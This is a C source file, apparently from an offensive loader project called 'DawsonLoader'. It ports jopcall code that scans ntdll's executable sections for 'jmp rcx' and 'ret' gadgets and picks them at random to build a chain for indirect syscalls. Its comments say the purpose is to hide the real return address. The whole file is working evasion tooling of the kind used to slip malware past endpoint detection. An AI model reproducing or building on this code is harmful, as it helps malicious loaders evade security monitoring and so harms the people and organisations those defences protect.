#include "DawsonLoader.h"

// ========== JOPCALL INTEGRATION FILE ==========
// This file contains code ported from https://github.com/NoahKirchner/jopcall
// Implements ROP/JOP gadget discovery and helper functions for return address obfuscation

// ========== HELPER FUNCTIONS (Ported from jopcall/src/helper.rs) ==========

// Search for byte pattern in source buffer (from helper.rs:29)
// Returns the index of the first match, or (DWORD)-1 if not found
DWORD search_bytes(BYTE* pattern, DWORD pattern_len, BYTE* source, DWORD source_len) {
    if (pattern_len > source_len) return (DWORD)-1;

    for (DWORD i = 0; i <= source_len - pattern_len; i++) {
        BOOL match = TRUE;
        for (DWORD j = 0; j < pattern_len; j++) {
            if (source[i + j] != pattern[j]) {
                match = FALSE;
                break;
            }
        }
        if (match) return i;
    }
    return (DWORD)-1;
}

// Pseudorandom number generator using RDTSC (from helper.rs:35)
// Uses CPU timestamp counter and combines with other registers for entropy
DWORD pseudorandom() {
    DWORD rng;
    __asm__(
        "xor eax, eax       \n"
        "cpuid              \n"
        "rdtsc              \n"
        "xor eax, ecx       \n"
        "shr eax, 2         \n"
        "xor eax, edx       \n"
        "shr eax, 2         \n"
        "xor eax, r8d       \n"
        "shr eax, 2         \n"
        "xor eax, r9d       \n"
        "xchg eax, ecx      \n"
        "rdtsc              \n"
        "rol eax, cl        \n"
        : "=a" (rng)
        :
        : "ecx", "edx", "r8", "r9"
    );
    return rng;
}

// Pick random gadget from array (from helper.rs:59)
// Uses pseudorandom() to select a random index
PVOID pick_random_gadget(PVOID* gadget_array, DWORD gadget_count) {
    if (gadget_count == 0) return NULL;
    DWORD seed = pseudorandom();
    return gadget_array[seed % gadget_count];
}

// ========== GADGET DISCOVERY (Ported from jopcall/src/jop.rs) ==========

// Get executable memory sections from DLL (from jop.rs:44)
// Parses PE headers and extracts section information
// Returns the number of sections found
DWORD get_image_memory_sections(PVOID dll_base_address, MemorySection* section_buffer, DWORD max_sections) {
    // Parse PE headers
    DWORD e_lfanew = *(DWORD*)((BYTE*)dll_base_address + 0x3C);
    PVOID nt_header_address = (BYTE*)dll_base_address + e_lfanew;
    WORD number_of_sections = *(WORD*)((BYTE*)nt_header_address + 0x06);

    // Limit to buffer size or actual section count
    DWORD sections_to_read = (number_of_sections < max_sections) ? number_of_sections : max_sections;

    // Section headers start at offset 0x108 from NT header
    PVOID section_header_address = (BYTE*)nt_header_address + 0x108;

    for (DWORD i = 0; i < sections_to_read; i++) {
        // Each IMAGE_SECTION_HEADER is 0x28 bytes
        PVOID header_address = (BYTE*)section_header_address + (i * 0x28);

        // Extract section information
        DWORD rva = *(DWORD*)((BYTE*)header_address + 0x0C);              // VirtualAddress
        PVOID address = (BYTE*)dll_base_address + rva;
        DWORD virtual_size = *(DWORD*)((BYTE*)header_address + 0x10);     // SizeOfRawData
        DWORD characteristics = *(DWORD*)((BYTE*)header_address + 0x24);  // Characteristics

        section_buffer[i].virtual_size = virtual_size;
        section_buffer[i].address = address;
        section_buffer[i].characteristics = characteristics;
    }

    return sections_to_read;
}

// Search for gadgets in memory sections (from jop.rs:76)
// Scans executable sections for specific byte patterns (gadgets)
// Returns the number of gadgets found
DWORD search_gadget(BYTE* gadget_asm, DWORD gadget_size, MemorySection* section_list, DWORD section_count, PVOID* gadget_buffer, DWORD max_gadgets) {
    DWORD gadget_counter = 0;

    // For every section with executable characteristics
    for (DWORD sec_idx = 0; sec_idx < section_count; sec_idx++) {
        if ((section_list[sec_idx].characteristics & SECTION_MEM_EXECUTE) == 0)
            continue;  // Skip non-executable sections

        BYTE* section_memory = (BYTE*)section_list[sec_idx].address;
        DWORD section_size = section_list[sec_idx].virtual_size;
        DWORD search_index = 0;

        // Search through the section for the gadget pattern
        while (gadget_counter < max_gadgets && search_index < section_size) {
            DWORD match_offset = search_bytes(gadget_asm, gadget_size,
                                              section_memory + search_index,
                                              section_size - search_index);

            if (match_offset == (DWORD)-1) break;  // No more matches in this section

            // Store the gadget address
            gadget_buffer[gadget_counter] = section_memory + search_index + match_offset;
            search_index += match_offset + gadget_size;  // Move past this gadget
            gadget_counter++;
        }

        if (gadget_counter >= max_gadgets) break;  // Buffer full
    }

    return gadget_counter;
}

// Find common ROP/JOP gadgets in ntdll for syscall obfuscation
// Discovers gadgets needed to build a ROP chain:
//   1. jmp rcx - to jump to the syscall address
//   2. ret gadgets - for the return chain
// Returns TRUE if successful, FALSE if gadgets not found
BOOL find_rop_gadgets(Dll* ntdll_module, GadgetChain* chain) {
    MemorySection sections[16];
    PVOID gadget_temp_buffer[MAX_GADGETS];

    // Get executable sections from ntdll
    DWORD section_count = get_image_memory_sections(ntdll_module->dllBase, sections, 16);

    if (section_count == 0) return FALSE;

    // Search for gadgets:
    // 1. jmp rcx (0xFF 0xE1) - for jumping to syscall
    //    This gadget allows us to indirectly call the syscall instruction
    BYTE jmp_rcx[] = {0xFF, 0xE1};
    DWORD jmp_count = search_gadget(jmp_rcx, sizeof(jmp_rcx), sections, section_count, gadget_temp_buffer, MAX_GADGETS);

    if (jmp_count == 0) return FALSE;  // Critical gadget not found

    chain->gadgets[0] = pick_random_gadget(gadget_temp_buffer, jmp_count);

    // 2. ret (0xC3) - for return chain
    //    These gadgets create the return address chain that obfuscates our real return location
    BYTE ret[] = {0xC3};
    DWORD ret_count = search_gadget(ret, sizeof(ret), sections, section_count, gadget_temp_buffer, MAX_GADGETS);

    if (ret_count > 0) {
        // Pick random ret gadgets for diversity
        chain->gadgets[1] = pick_random_gadget(gadget_temp_buffer, ret_count);
        chain->gadgets[2] = pick_random_gadget(gadget_temp_buffer, ret_count);
        chain->gadgets[3] = pick_random_gadget(gadget_temp_buffer, ret_count);
        chain->count = 4;
    } else {
        // If no ret gadgets found, still usable with just jmp rcx
        chain->count = 1;
    }

    return TRUE;
}
